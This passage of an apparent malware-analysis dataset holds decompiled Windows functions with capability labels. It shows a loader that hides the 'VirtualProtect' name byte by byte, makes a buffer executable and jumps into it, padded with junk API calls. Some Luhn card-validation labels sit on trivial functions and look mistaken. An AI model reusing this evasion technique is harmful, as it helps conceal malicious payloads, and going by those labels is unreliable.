var_64h = 0x403392;\n        (*_sym.imp.KERNEL32.dll_SetHandleInformation)();\n        var_10h = 0x40339a;\n        fcn.00404706();\n        var_10h = 0x4033a2;\n        fcn.004047c7();\n        var_10h = 0x4033aa;\n        fcn.00402f80();\n        var_10h = 0x4033b1;\n        fcn.00402fa0();\n        var_10h = NULL;\n        var_14h._0_1_ = 0xb7;\n        var_14h._1_1_ = 0x33;\n        var_14h._2_2_ = 0x40;\n        fcn.00404994(0);\n        var_14h._0_1_ = 0;\n        var_14h._1_1_ = 0;\n        var_14h._2_2_ = 0;\n        lpConsoleCursorInfo._0_1_ = 0xbd;\n        lpConsoleCursorInfo._1_1_ = 0x33;\n        lpConsoleCursorInfo._2_2_ = 0x40;\n        fcn.00404994(0);\n        lpConsoleCursorInfo._0_1_ = 0;\n        lpConsoleCursorInfo._1_1_ = 0;\n        lpConsoleCursorInfo._2_2_ = 0;\n        var_1ch = 0xc3;\n        uStackY31 = 0x33;\n        uStackY30 = 0x40;\n        fcn.00404972(0);\n        var_10h = 0x4033cb;\n        fcn.004045ef();\n    }\n    *0x43ec7c = *0x43ec7c + 0xb2d3b;\n    var_10h = 0x4033da;\n    fcn.00403275();\n    var_10h = 0x4033df;\n    fcn.00403289();\n    uVar1 = 0;\n    if (*0x43ec7c != 0) {\n        do {\n            (*0x43d858)[uVar1] = *(*0x43ee1c + 0xb2d3b + uVar1);\n            uVar1 = uVar1 + 1;\n        } while (uVar1 < *0x43ec7c);\n    }\n    iVar2 = 0;\n    do {\n        if (*0x43ec7c + iVar2 == 0x5e) {\n            var_10h = NULL;\n            var_14h._0_1_ = 0;\n            var_14h._1_1_ = 0;\n            var_14h._2_2_ = 0;\n            lpConsoleCursorInfo._0_1_ = 0;\n            lpConsoleCursorInfo._1_1_ = 0;\n            lpConsoleCursorInfo._2_2_ = 0;\n            var_1ch = 0;\n            uStackY31 = 0;\n            uStackY30 = 0;\n            lpDate._0_1_ = 0x24;\n            lpDate._1_1_ = 0x34;\n            lpDate._2_2_ = 0x40;\n            (*_sym.imp.KERNEL32.dll_VerSetConditionMask)();\n            lpCommTimeouts = 0;\n            var_1dch = 0;\n            uStackY476 = 0;\n            uStackY472 = 0;\n            uStackY468 = 0;\n            lpDate._0_1_ = SUB41(&fcn.0040333e::lpCommTimeouts, 0);\n            lpDate._1_1_ = &fcn.0040333e::lpCommTimeouts >> 8;\n            lpDate._2_2_ = &fcn.0040333e::lpCommTimeouts >> 0x10;\n            var_24h = &fcn.0040333e::lpDCB;\n            var_28h = 0x402c18;\n            var_2ch = 0x40344f;\n            (*_sym.imp.KERNEL32.dll_BuildCommDCBAndTimeoutsA)();\n            var_2ch = 0;\n            var_30h = 0;\n            var_34h = 0;\n            var_38h = NULL;\n            var_3ch = NULL;\n            var_40h = 0x40345a;\n            (*_sym.imp.KERNEL32.dll_EnumResourceLanguagesA)();\n            dwCursorPosition = 0;\n            var_40h = 0;\n            var_44h = 0;\n            var_48h = 0x40346f;\n            (*_sym.imp.KERNEL32.dll_SetConsoleCursorPosition)();\n            var_48h = 0;\n            var_4ch = &fcn.0040333e::lpDestStr;\n            var_50h = 0;\n            var_54h = 0;\n            var_58h = 0;\n            var_5ch = NULL;\n            var_60h = 0x403481;\n            (*_sym.imp.KERNEL32.dll_LCMapStringA)();\n            var_60h = 0;\n            var_64h = 0;\n            var_68h = 0;\n            var_6ch = 0x40348a;\n            (*_sym.imp.KERNEL32.dll_GetCPInfoExW)();\n            var_6ch = 0;\n            var_70h = &fcn.0040333e::var_1200h;\n            var_74h = 0;\n            var_78h = 0;\n            var_7ch = 0;\n            var_80h = 0x40349b;\n            (*_sym.imp.KERNEL32.dll_FoldStringW)();\n            var_80h = &fcn.0040333e::lpBuffer;\n            var_84h = 0;\n            var_88h = 0x4034a9;\n            (*_sym.imp.KERNEL32.dll_GetTempPathA)();\n            lpDate._0_1_ = 0;\n            lpDate._1_1_ = 0;\n            lpDate._2_2_ = 0;\n            var_1ch = 0;\n            uStackY31 = 0;\n            uStackY30 = 0;\n            lpConsoleCursorInfo._0_1_ = 0;\n            lpConsoleCursorInfo._1_1_ = 0;\n            lpConsoleCursorInfo._2_2_ = 0;\n            var_14h._0_1_ = 0;\n            var_14h._1_1_ = 0;\n            var_88h = 0;\n            var_14h._2_2_ = 0;\n            var_8ch = &fcn.0040333e::lpDateStr;\n            var_90h = 0x402c3c;\n            var_94h = &fcn.0040333e::lpDate;\n            var_98h = 0;\n            var_9ch = 0;\n            var_a0h = 0x4034d0;\n            (*_sym.imp.KERNEL32.dll_GetDateFormatW)();\n            var_a0h = 0;\n            var_a4h = 0;\n            var_a8h = 0;\n            var_ach = 0x4034d9;\n            (*_sym.imp.KERNEL32.dll_GlobalReAlloc)();\n            var_ach = 0;\n            var_b0h = 0;\n            var_b4h = &fcn.0040333e::lpString1;\n            var_b8h = 0x4034e8;\n            (*_sym.imp.KERNEL32.dll_lstrcpynA)();\n            var_b8h = 0;\n            var_bch = &stack0xffffd9fc;\n            var_c0h = 0x4034f6;\n            (*_sym.imp.KERNEL32.dll_GetWindowsDirectoryW)();\n        }\n        iVar2 = iVar2 + 1;\n    } while (iVar2 < 0x40c893);\n    iVar2 = 0;\n    do {\n        var_10h = NULL;\n        var_14h._0_1_ = 0;\n        var_14h._1_1_ = 0;\n        var_14h._2_2_ = 0;\n        lpConsoleCursorInfo._0_1_ = 0xd;\n        lpConsoleCursorInfo._1_1_ = 0x35;\n        lpConsoleCursorInfo._2_2_ = 0x40;\n        (*_sym.imp.KERNEL32.dll_GetCommMask)();\n        lpConsoleCursorInfo._0_1_ = 0x13;\n        lpConsoleCursorInfo._1_1_ = 0x35;\n        lpConsoleCursorInfo._2_2_ = 0x40;\n        (*_sym.imp.KERNEL32.dll_GetLastError)();\n        lpConsoleCursorInfo._0_1_ = 0x19;\n        lpConsoleCursorInfo._1_1_ = 0x35;\n        lpConsoleCursorInfo._2_2_ = 0x40;\n        (*_sym.imp.KERNEL32.dll_GetCurrentProcess)();\n        if (iVar2 < 0x26e7e4) {\n            var_1c4h = 0x7411c935;\n            var_88h = 0x490592a8;\n            var_e0h = 0x4ba00a96;\n            var_60h = 0x2eadbf3b;\n            var_138h = 0x41510c79;\n            var_150h = 0x67cfba29;\n            var_188h = 0xcc2a85e;\n            var_b0h = 0x5055dc3a;\n            var_d8h = 0x7483e354;\n            var_130h = 0x9dcfd62;\n            var_178h = 0x27cd3417;\n            var_bch = 0x6c26b30a;\n            var_1b4h = 0x2d45c1d;\n            var_a8h = 0x68592c56;\n            var_154h = 0x101f0e65;\n            var_120h = 0x622c3fc4;\n            var_7ch = 0x3d2aa76b;\n            var_70h = 0x5f2549cb;\n            var_100h = 0x7527bccb;\n            var_11ch = 0x63bcbf2f;\n            var_74h = 0x4a99d7f3;\n            var_c8h = 0x5dcb9a3a;\n            var_148h = 0x365b810e;\n            var_5ch = 0x462c8607;\n            var_a0h = 0xd834ce2;\n            var_1cch = 0x1b70862e;\n            var_b4h = 0x6732085c;\n            var_54h = 0x7b00a12e;\n            var_180h = 0x1dd14d26;\n            var_198h = 0x1aceebc2;\n            var_114h = 0x1e2fdcf6;\n            var_50h = 0x7d71a239;\n            var_1b8h = 0x5e2d51dd;\n            var_140h = 0x77e00076;\n            var_14ch = 0x5e5a9d7d;\n            var_10ch = 0x53613019;\n            dwCursorPosition = 0x1f34a4b1;\n            var_144h = 0x32c374a0;\n            var_ach = 0x40c381e1;\n            var_184h = 0xd345695;\n            var_158h = 0x2fe99d90;\n            var_a4h = 0x1485481f;\n            var_6ch = 0x25c7ab0f;\n            var_e4h = 0x29a49e8a;\n            var_110h = 0x6deda4b1;\n            var_30h = 0x74801dd4;\n            var_174h = 0x5d44218b;\n            var_34h = 0xa72d063c;\n            var_13ch = 0xbc84502c;\n            var_cch = 0xeea4eb40;\n            var_16ch = 0xb2cb5801;\n            var_168h = 0x30ffcddb;\n            var_104h = 0xd9fa9757;\n            var_e8h = 0xb9c45458;\n            var_128h = 0x96f96efd;\n            var_f0h = 0x74e02cdc;\n            var_194h = 0x8fbe7ab1;\n            nSize = 0xac11e2b9;\n            var_dch = 0x9edfb772;\n            var_90h = 0xaf6cdd2b;\n            var_108h = 0x62f69bb0;\n            var_68h = 0xd23269e4;\n            var_1c0h = 0xc705d1ec;\n            var_124h = 0xa1b71f75;\n            var_1c8h = 0x3e1b20e9;\n            var_18ch = 0x65a8fec5;\n            var_80h = 0xe87d9313;\n            var_12ch = 0x19084f97;\n            var_8ch = 0xafce5d3a;\n            var_17ch = 0x3c6056b9;\n            var_48h = 0xfcd528c9;\n            var_f4h = 0x32b71299;\n            var_3ch = 0xec7b1f84;\n            var_190h = 0xddfcbace;\n            var_1a0h = 0xa4ff2448;\n            var_1bch = 0xc0f1f821;\n            var_84h = 0x4ae1b5a2;\n            var_14h._0_1_ = 0x7a;\n            var_14h._1_1_ = 0xf1;\n            var_14h._2_2_ = 0x9a46;\n            lpNumberOfCharsWritten = 0x8d707709;\n            var_15ch = 0x6c42ae72;\n            var_58h = 0x8bcfb75a;\n            var_19ch = 0x7a0f10b3;\n            var_64h = 0x3f9f80ea;\n            var_40h = 0xef2070d8;\n            var_fch = 0x7a17b8c7;\n            var_94h = 0x6a93b5c1;\n            var_10h = 0x78814caa;\n            var_1b0h = 0x3b7b3484;\n            var_f8h = 0x8a941baf;\n            var_1a8h = 0x7bc6b623;\n            var_d4h = 0xa3a0ca4e;\n            var_160h = 0x67bfefe3;\n            var_38h = 0xec3ec85a;\n            var_c0h = 0xeb7e5ed8;\n            var_d0h = 0xe92d9134;\n            var_134h = 0x50610d0c;\n            var_164h = 0x7ab243ed;\n            var_118h = 0x50e5d1ca;\n            var_78h = 0xc7045f08;\n            var_ech = 0x623d21c6;\n            var_44h = 0x7fc321ff;\n            var_98h = 0xbffa3b5c;\n            var_1ach = 0x1b120dd6;\n            var_1a4h = 0xe32b6521;\n            var_9ch = 0xc4a021b2;\n            var_4ch = 0x3d0a671d;\n            var_c4h = 0x50e90330;\n            var_b8h = 0xb7cc02f2;\n            var_170h = 0xca81ff5f;\n        }\n        lpConsoleCursorInfo._0_1_ = 0;\n        lpConsoleCursorInfo._1_1_ = 0;\n        lpConsoleCursorInfo._2_2_ = 0;\n        var_1ch = 0;\n        uStackY31 = 0;\n        uStackY30 = 0;\n        lpDate._0_1_ = 0;\n        lpDate._1_1_ = 0;\n        lpDate._2_2_ = 0;\n        var_24h = NULL;\n        var_28h = NULL;\n        var_2ch = 0x404379;\n        (*_sym.imp.KERNEL32.dll_GetGeoInfoW)();\n    } while ((iVar2 < 0x242696) && (iVar2 = iVar2 + 1,  iVar2 < 0x15a2287c));\n    iVar2 = 0x4f4;\n    do {\n        var_10h = NULL;\n        var_14h._0_1_ = 0x9a;\n        var_14h._1_1_ = 0x43;\n        var_14h._2_2_ = 0x40;\n        (*_sym.imp.USER32.dll_GetListBoxInfo)();\n        var_14h._0_1_ = 0;\n        var_14h._1_1_ = 0;\n        var_14h._2_2_ = 0;\n        lpConsoleCursorInfo._0_1_ = 0;\n        lpConsoleCursorInfo._1_1_ = 0;\n        lpConsoleCursorInfo._2_2_ = 0;\n        var_1ch = 0xa2;\n        uStackY31 = 0x43;\n        uStackY30 = 0x40;\n        (*_sym.imp.USER32.dll_LoadMenuA)();\n        iVar2 = iVar2 + -1;\n    } while (iVar2 != 0);\n    var_10h = 0x4043aa;\n    fcn.004031dc();\n    do {\n        if (iVar2 == 0xbde) {\n            var_10h = 0x4043b7;\n            fcn.0040325b();\n        }\n        if (*0x43ec7c == 0x1125) {\n            var_10h = NULL;\n            var_14h._0_1_ = SUB41(&fcn.0040333e::lpNumberOfCharsWritten, 0);\n            var_14h._1_1_ = &fcn.0040333e::lpNumberOfCharsWritten >> 8;\n            var_14h._2_2_ = &fcn.0040333e::lpNumberOfCharsWritten >> 0x10;\n            lpConsoleCursorInfo._0_1_ = 0;\n            lpConsoleCursorInfo._1_1_ = 0;\n            lpConsoleCursorInfo._2_2_ = 0;\n            var_1ch = 0;\n            uStackY31 = 0;\n            uStackY30 = 0;\n            lpDate._0_1_ = 0;\n            lpDate._1_1_ = 0;\n            lpDate._2_2_ = 0;\n            var_24h = 0x4043d1;\n            (*_sym.imp.KERNEL32.dll_WriteConsoleW)();\n        }\n        iVar2 = iVar2 + 1;\n    } while (iVar2 < 0x409495);\n    iVar2 = 0x7b;\n    do {\n        if (*0x43ec7c == 0x86) {\n            var_10h = NULL;\n            var_14h._0_1_ = 0xf0;\n            var_14h._1_1_ = 0x43;\n            var_14h._2_2_ = 0x40;\n            (*_sym.imp.KERNEL32.dll_AddAtomA)();\n        }\n        iVar2 = iVar2 + -1;\n    } while (iVar2 != 0);\n    iVar2 = 0x180ee;\n    do {\n        if (*0x43ec7c == 0x1f) {\n            var_10h = &fcn.0040333e::lpConsoleCursorInfo;\n            var_14h._0_1_ = 0;\n            var_14h._1_1_ = 0;\n            var_14h._2_2_ = 0;\n            lpConsoleCursorInfo._0_1_ = 0xc;\n            lpConsoleCursorInfo._1_1_ = 0x44;\n            lpConsoleCursorInfo._2_2_ = 0x40;\n            (*_sym.imp.KERNEL32.dll_SetConsoleCursorInfo)();\n            lpConsoleCursorInfo._0_1_ = 0;\n            lpConsoleCursorInfo._1_1_ = 0;\n            lpConsoleCursorInfo._2_2_ = 0;\n            var_1ch = SUB41(&fcn.0040333e::lpNumberOfCharsWritten, 0);\n            uStackY31 = &fcn.0040333e::lpNumberOfCharsWritten >> 8;\n            uStackY30 = &fcn.0040333e::lpNumberOfCharsWritten >> 0x10;\n            lpDate._0_1_ = 0;\n            lpDate._1_1_ = 0;\n            lpDate._2_2_ = 0;\n            var_24h = &fcn.0040333e::lpString1;\n            var_28h = NULL;\n            var_2ch = 0x404420;\n            (*_sym.imp.KERNEL32.dll_WriteConsoleA)();\n            var_2ch = 0;\n            var_30h = 0;\n            var_34h = 0x404428;\n            (*_sym.imp.KERNEL32.dll_GetWindowsDirectoryA)();\n            var_34h = 0;\n            var_38h = 0x40442f;\n            (*_sym.imp.KERNEL32.dll_SetLastError)();\n            var_38h = &fcn.0040333e::nSize;\n            var_3ch = &stack0xffffd9fc;\n            var_40h = 0x404440;\n            (*_sym.imp.KERNEL32.dll_GetComputerNameW)();\n            var_40h = 0;\n            var_44h = 0;\n            var_48h = 0x404448;\n            (*_sym.imp.KERNEL32.dll_EnumSystemCodePagesW)();\n            var_48h = 0;\n            var_4ch = NULL;\n            var_50h = 0x404450;\n            (*_sym.imp.KERNEL32.dll_TerminateJobObject)();\n            var_50h = 0;\n            var_54h = 0;\n            var_58h = 0;\n            var_5ch = 0x404459;\n            (*_sym.imp.KERNEL32.dll_GetVolumeNameForVolumeMountPointA)();\n            dwCursorPosition = 0;\n            var_5ch = &fcn.0040333e::var_10h;\n            var_60h = 0;\n            var_64h = 0;\n            var_68h = 0x402c78;\n            var_6ch = 0;\n            var_70h = 0x404478;\n            (*_sym.imp.KERNEL32.dll_WriteConsoleOutputCharacterA)();\n        }\n        iVar2 = iVar2 + -1;\n    } while (iVar2 != 0);\n    var_10h = 0x404484;\n    fcn.00402fef();\n    *0x43ec70 = *0x43d858;\n    var_10h = 0x404490;\n    (**0x43d858)();\n    return;\n}\n",
        "token_count": 6918
    },
    "0040304f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040304f(void)\n\n{\n    int32_t *in_EAX;\n    \n    *in_EAX = *in_EAX + -0x3910cb1f;\n    return;\n}\n",
        "token_count": 46
    },
    "00403056": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00403056(int32_t param_1)\n\n{\n    int32_t *in_EAX;\n    \n    *in_EAX = *in_EAX + param_1;\n    return;\n}\n",
        "token_count": 47
    },
    "0040325b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040325b(void)\n\n{\n    uint var_4h;\n    \n    *0x43d858 = *0x43d858 + 0x6201;\n    return;\n}\n",
        "token_count": 45
    },
    "00403289": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "link function at runtime on Windows"
        ],
        "decompiled_code": "\nvoid fcn.00403289(void)\n\n{\n    uint var_8h;\n    uint var_4h;\n    \n    *0x43d85c = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(0x402bf8);\n    *0x428c18 = 0x56;\n    *0x428c19 = 0x69;\n    *0x428c1a = 0x72;\n    *0x428c1f = 0x50;\n    *0x428c25 = 0x74;\n    *0x428c26 = 0;\n    *0x428c1b = 0x74;\n    *0x428c1c = 0x75;\n    *0x428c1d = 0x61;\n    *0x428c1e = 0x6c;\n    *0x428c20 = 0x72;\n    *0x428c21 = 0x6f;\n    *0x428c22 = 0x74;\n    *0x428c23 = 0x65;\n    *0x428c24 = 99;\n    *0x43d850 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(*0x43d85c, 0x428c18);\n    var_4h = 0x40;\n    (**0x43d850)(*0x43d858, *0x43ec7c, 0x40, &var_8h);\n    return;\n}\n",
        "token_count": 334
    },
    "004045d4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.004045d4(void)\n\n{\n    int32_t in_EAX;\n    \n    if (0xf < *(in_EAX + 0x18)) {\n        return *(in_EAX + 4);\n    }\n    return in_EAX + 4;\n}\n",
        "token_count": 62
    },
    "00404f05": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404f05(uint arg_8h)\n\n{\n    fcn.00404dd9(arg_8h, 0, 0);\n    return;\n}\n",
        "token_count": 41
    },
    "00407b4a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00407b5e)\n// WARNING: Removing unreachable block (ram,0x00407b64)\n// WARNING: Removing unreachable block (ram,0x00407b66)\n\nvoid fcn.00407b4a(void)\n\n{\n    return;\n}\n",
        "token_count": 66
    },
    "004068e3": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.004068e3(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *arg_8h_00;\n    int32_t *piVar3;\n    int32_t *piVar4;\n    int32_t unaff_EBP;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00405f4c(0x40f990, 0xc);\n    fcn.00407dd8(0xe);\n    *(unaff_EBP + -4) = 0;\n    arg_8h_00 = *0x428408;\n    iVar1 = *(unaff_EBP + 8);\n    iVar2 = *(iVar1 + 4);\n    if (iVar2 != 0) {\n        piVar3 = 0x428404;\n        do {\n            piVar4 = piVar3;\n            *(unaff_EBP + -0x1c) = arg_8h_00;\n            if (arg_8h_00 == NULL) goto code_r0x00406927;\n            piVar3 = arg_8h_00;\n        } while (*arg_8h_00 != iVar2);\n        piVar4[1] = arg_8h_00[1];\n        fcn.0040562b(arg_8h_00);\ncode_r0x00406927:\n        fcn.0040562b(*(iVar1 + 4));\n        *(iVar1 + 4) = 0;\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    fcn.0040694a();\n    fcn.00405f91();\n    return;\n}\n",
        "token_count": 394
    }
}